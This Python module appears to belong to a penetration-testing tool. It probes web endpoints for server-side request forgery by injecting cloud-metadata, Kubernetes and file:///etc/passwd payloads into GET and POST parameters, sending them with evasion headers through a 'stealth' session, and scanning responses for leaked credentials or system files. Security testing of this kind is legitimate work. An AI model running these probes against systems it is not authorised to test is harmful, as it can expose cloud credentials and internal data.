"""
SSRF (Server-Side Request Forgery) scanner for spring2shell.

Probes GET/POST parameters with cloud metadata, internal service,
and protocol-trick payloads to detect SSRF vulnerabilities.
"""

from __future__ import annotations

import json
import logging
import time
import urllib.parse
from pathlib import Path
from typing import Any

import requests

from spring2shell.core.reporter import build_finding
from spring2shell.core.session import create_stealth_session
from spring2shell.evasion.headers import get_random_headers
from spring2shell.utils.auth import apply_auth, audit_log, rate_limit_acquire
from spring2shell.utils.logging import log_event, log_swallowed_exception
from spring2shell.utils.network import ssl_verify
from spring2shell.utils.signals import is_interrupted


# ---------------------------------------------------------------------------
# Payload loader
# ---------------------------------------------------------------------------

def _load_ssrf_payloads() -> dict[str, Any]:
    path = Path(__file__).parents[3] / "data" / "payloads" / "ssrf_payloads.json"
    try:
        with path.open() as fh:
            return json.load(fh)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}


# ---------------------------------------------------------------------------
# SSRF detection helpers
# ---------------------------------------------------------------------------

# Indicators in response body suggesting SSRF success
_SSRF_INDICATORS = [
    # AWS metadata
    "ami-id", "instance-id", "security-credentials",
    "iam/info", "identity-document",
    # GCP metadata
    "computeMetadata", "project-id", "service-accounts",
    # Azure
    "azure", "msi/token",
    # Redis
    "+PONG", "-NOAUTH", "$", "*",
    # K8s
    "namespaces", "apiVersion", "kind", "ServiceAccount",
    # Docker
    "\"Id\":", "\"Names\":", "\"Image\":",
    # File content
    "root:x:", "/bin/bash", "/bin/sh",
    # Elasticsearch
    "cluster_name", "\"status\"", "\"indices\"",
]

_SSRF_PARAM_NAMES = [
    "url", "target", "redirect", "redirectUrl", "next", "dest", "destination",
    "host", "server", "to", "out", "image", "src", "source", "uri", "path",
    "resource", "forward", "href", "link", "return", "returnUrl", "callback",
    "proxy", "endpoint", "fetch", "load", "page", "site", "data", "feed",
    "webhook", "remote", "import", "export", "open", "ref", "reference",
]


def _check_ssrf_response(resp: requests.Response, payload_url: str) -> str | None:
    """Return a description if SSRF indicators are found in the response."""
    text = resp.text
    for indicator in _SSRF_INDICATORS:
        if indicator in text:
            return f"SSRF indicator '{indicator}' found when targeting {payload_url}"
    # Also check status code anomalies — a 200 on a metadata URL is suspicious
    if resp.status_code == 200 and any(
        cloud in payload_url for cloud in ["169.254.169.254", "metadata.google", "kubernetes.default"]
    ):
        if len(text) > 10:
            return f"Suspicious 200 OK from cloud metadata request to {payload_url}"
    return None


# ---------------------------------------------------------------------------
# Main SSRF scan function
# ---------------------------------------------------------------------------

def ssrf_scan(target_url: str, endpoints: list[str] | None = None) -> list[dict[str, Any]]:
    """Probe *target_url* for SSRF vulnerabilities.

    Injects SSRF payloads into common GET parameters and POST body fields.

    Args:
        target_url: Base URL of the target.
        endpoints:  List of endpoint paths to probe (default: common API paths).

    Returns:
        List of finding dicts.
    """
    log_event(logging.INFO, "ssrf-scan start", target=target_url)
    findings: list[dict[str, Any]] = []

    ssrf_db = _load_ssrf_payloads()
    session = create_stealth_session()
    apply_auth(session)

    # Collect all payload URLs
    all_payloads: list[str] = []
    for category, data in ssrf_db.items():
        if isinstance(data, dict) and "payloads" in data:
            all_payloads.extend(data["payloads"])

    if not all_payloads:
        # Minimal fallback
        all_payloads = [
            "http://169.254.169.254/latest/meta-data/",
            "http://kubernetes.default.svc/api/v1/namespaces",
            "file:///etc/passwd",
        ]

    param_names = ssrf_db.get("param_names", _SSRF_PARAM_NAMES)
    if isinstance(param_names, list):
        pass
    else:
        param_names = _SSRF_PARAM_NAMES

    # Default endpoints to test
    if not endpoints:
        endpoints = [
            "/api/v1/fetch", "/api/fetch", "/api/proxy",
            "/api/v1/proxy", "/api/url", "/fetch",
            "/proxy", "/redirect", "/v1/webhook",
        ]

    for ep in endpoints:
        if is_interrupted():
            break
        full_url = urllib.parse.urljoin(target_url.rstrip("/") + "/", ep.lstrip("/"))

        for ssrf_payload in all_payloads[:15]:  # cap at 15 payloads per endpoint
            if is_interrupted():
                break

            headers = get_random_headers()

            # ── GET parameter injection ────────────────────────────────────
            for param in param_names[:8]:  # top 8 param names
                rate_limit_acquire()
                probe_url = f"{full_url}?{param}={urllib.parse.quote(ssrf_payload)}"
                try:
                    resp = session.get(probe_url, headers=headers, timeout=8,
                                       allow_redirects=False)
                    audit_log("GET", probe_url, resp.status_code, ssrf_payload, "ssrf_probe")
                    evidence = _check_ssrf_response(resp, ssrf_payload)
                    if evidence:
                        finding = build_finding(
                            url=target_url,
                            endpoint=full_url,
                            status="unverified",
                            confidence="medium",
                            cve="CVE-2024-22243",
                            reason="SSRF_INDICATOR_IN_RESPONSE",
                            evidence=evidence,
                            payload=f"?{param}={ssrf_payload}",
                            method="GET",
                            status_code=resp.status_code,
                        )
                        findings.append(finding)
                        log_event(logging.WARNING, "SSRF candidate", url=probe_url, evidence=evidence)
                except Exception as exc:
                    log_swallowed_exception(f"ssrf-scan GET {probe_url}", exc)

            # ── POST body injection ────────────────────────────────────────
            for param in param_names[:4]:
                rate_limit_acquire()
                post_body = json.dumps({param: ssrf_payload})
                headers["Content-Type"] = "application/json"
                try:
                    resp = session.post(full_url, data=post_body, headers=headers, timeout=8,
                                        allow_redirects=False)
                    audit_log("POST", full_url, resp.status_code, post_body, "ssrf_probe")
                    evidence = _check_ssrf_response(resp, ssrf_payload)
                    if evidence:
                        finding = build_finding(
                            url=target_url,
                            endpoint=full_url,
                            status="unverified",
                            confidence="medium",
                            cve="CVE-2024-22243",
                            reason="SSRF_INDICATOR_IN_RESPONSE",
                            evidence=evidence,
                            payload=post_body[:200],
                            method="POST",
                            status_code=resp.status_code,
                        )
                        findings.append(finding)
                        log_event(logging.WARNING, "SSRF candidate (POST)", url=full_url)
                except Exception as exc:
                    log_swallowed_exception(f"ssrf-scan POST {full_url}", exc)

            time.sleep(0.3)

    log_event(logging.INFO, "ssrf-scan complete", findings=len(findings))
    return findings
